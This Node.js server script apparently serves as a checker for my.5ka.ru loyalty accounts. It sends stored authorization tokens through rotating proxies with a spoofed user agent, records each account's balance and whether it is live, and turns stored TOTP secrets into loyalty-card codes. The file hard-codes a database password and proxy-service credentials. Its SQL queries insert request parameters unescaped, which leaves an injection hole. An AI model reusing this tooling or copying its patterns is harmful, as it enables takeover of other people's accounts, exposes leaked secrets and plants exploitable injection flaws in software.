var app = require('express')();
var http = require('http').createServer(app);
var mysql = require('mysql');
app.use(require('express').static(__dirname + '/'));
http.listen(80);

var connection = mysql.createConnection({
	host     : '37.140.192.184',
	user     : 'u1109153_default',
	password : 'g!wUd8NI',
	database : 'u1109153_default'
});
connection.connect();
app.get('/', function(req, res){
	res.sendfile(__dirname + '/index.html');
	res.sendfile(__dirname + '/index.css');
});
app.get('/404', function(req, res){
	res.sendFile(__dirname + '/404.html');
});
//Функция Рандом Строки
function makeid(length) {
	var result           = '';
	var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
	var charactersLength = characters.length;
	for ( var i = 0; i < length; i++ ) {
	   result += characters.charAt(Math.floor(Math.random() * charactersLength));
	}
	return result;
}
//Фукнция рандом числа
function randomInteger(min, max) {
	// получить случайное число от (min-0.5) до (max+0.5)
	let rand = min - 0.5 + Math.random() * (max - min + 1);
	return Math.round(rand);
}
app.get('/token/api?:t?:u', function(req, res) {
	var token = req.query['t'];
	var update = req.query['u'];
	mysqlQuery = "SELECT * FROM `tokens` WHERE `link` LIKE '"+ token  +"'";
	connection.query(mysqlQuery, function(errors, results){
		setTimeout(getParams, 1);
		function getParams(){
			connection.query("SELECT * FROM `proxy`", function(errors, proxy_res){
				if(results.length > 0){
					let id = results[0]['id'];
					let tokenx = results[0]['tokenx'];
					let totp = results[0]['totp'];
					let card = results[0]['card'];
					let balance = results[0]['balance'];
					let id_card = results[0]['id'];
					let stickers = results[0]['stickers'];
					let cookie = results[0]['cookie'];
					let proxy_id = randomInteger(0, proxy_res.length - 1);
					if(proxy_res[proxy_id] == undefined){
						var pass = 'localhost';
						var ip = 'localhost';
					}else{
						var pass = proxy_res[proxy_id]['password'];
						var ip = proxy_res[proxy_id]['ip'];
					}
					let device_id = makeid(8)+ makeid(4)+ makeid(4)+ makeid(4)+ makeid(12);
					var request = require('request');
					var options = {
						'method': 'GET',
						'url': 'https://my.5ka.ru/api/v1/users/me',
						//'proxy': 'http://lum-customer-hl_7000f344-zone-static-country-ru:0ift2lobao4f@zproxy.lum-superproxy.io:22225',
						'proxy': 'http://'+ pass +'@'+ ip,
						'headers': {
							'X-Authorization': tokenx,
							'Connection': 'keep-alive',
							//'X-DEVICE-ID': device_id,
							//'X-PLATFORM': 'ios',
							'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
							//'X-APP-VERSION': '3.1.1',
							//'X-CAN-RECEIVE-PUSH': 'false',
							'Accept': 'application/json, text/plain, */*',
							'Origin': 'my.5ka.ru',
							'Accept-Language': 'ru',
							'Cookie': 'cookie',
							'Accept-Encoding': 'gzip, deflate, br',
						}
					};
					/*if(update == "true"){
						options['url'] = 'https://my.5ka.ru/api/v1/users/me';
						request(options, function(error, response){
							response = JSON.parse(response.body);
							var card_id = response['cards']['main'];
							options['url'] = 'https://my.5ka.ru/api/v2/users/balance/';
							request(options, function(error, response){
							});
						});
					}*/
					//options['url'] = 'https://my.5ka.ru/api/guests/v2/exists/';
					//request(options, function(error, response){});
					if(balance == "" || update == "true"){
						options['url'] = 'https://my.5ka.ru/api/v1/users/me';
						request(options, function(error, response){
							if(response != undefined){
								response = JSON.parse(response.body);
								var card_id = response['cards']['main'];
								options['url'] = 'https://my.5ka.ru/api/v2/users/balance/';
								request(options, function(error, response){
								options['url'] = 'https://my.5ka.ru/api/v1/cards/'+card_id;
								request(options, function (error, response) {
								if(error != null){
									getParams();
									return;
								}
									if(response != undefined){
										if(response.statusCode == 200){
											if(response.body.includes('Rejected') == false){
												var response = JSON.parse(response.body);
											}else{
												getParams();
												return;
											}
											if(response['error'] != undefined || response['status'] != 1){
												var live = false;
												res.json({balance: results[0]['balance'], stickers: results[0]['stickers'], live: live});					
											}else{
												var live = true;
												var stickers = response['sticker_balance'];
												var totp = response['totp_secret'];
												var card = response['number'];
												var balance = response['balance']['points'];
												if(balance != undefined && stickers != undefined){
													mysqlQuery = "UPDATE `tokens` SET `totp` = '" + totp + "', `card` = '" + card + "', `balance` = '" + balance + "', `stickers` = '" + stickers + "' WHERE `tokens`.`id` = "+ id +"";
													connection.query(mysqlQuery, function(errors, results){
													});
													res.json({balance: balance, stickers: stickers, live: live});
												}
											}
										}else{
											res.json({balance: results[0]['balance'], stickers: results[0]['stickers'], live: false});			
										}
									}else{
										res.json({balance: results[0]['balance'], stickers: results[0]['stickers'], live: live});		
									}
								});
								});
							}else{
								console.log('Прокси Похоже Что Сдохли http://'+ pass +'@'+ ip);
								res.json({balance: results[0]['balance'], stickers: results[0]['stickers'], live: false});		
							}
						});
					}else{
						var live = true;
						res.json({balance: results[0]['balance'], stickers: results[0]['stickers'], live: live});
					}
					}else{
						res.redirect('/');
					}
				});
		}
	});
})
app.get('/token/api/qr?:t', function(req, res) {
	var token = req.query['t'];
	mysqlQuery = "SELECT * FROM `tokens` WHERE `link` LIKE '"+ token  +"'";
	connection.query(mysqlQuery, function(errors, results){
		if(results.length > 0){
			var base32 = require('base32-hex');
			var base64 = require('base-64');
			let totp = results[0]['totp'];
			let card = results[0]['card'];
			var totpSecret = base32.encode(totp);
			OTPAuth = require('otpauth');
			let totpCode = new OTPAuth.TOTP({
				issuer: 'ACME',
				label: 'AzureDiamond',
				algorithm: 'SHA1',
				digits: 6,
				period: 300,
				secret: totpSecret
			});
			let token = totpCode.generate();
			token = card + ' ' + token;
			res.json({code: token});
		}else{
			res.redirect('/');
		}	
	});	
});
app.get('/token?:t', function(req, res){
	var token = req.query['t'];	
	res.sendFile(__dirname + '/index.html');
})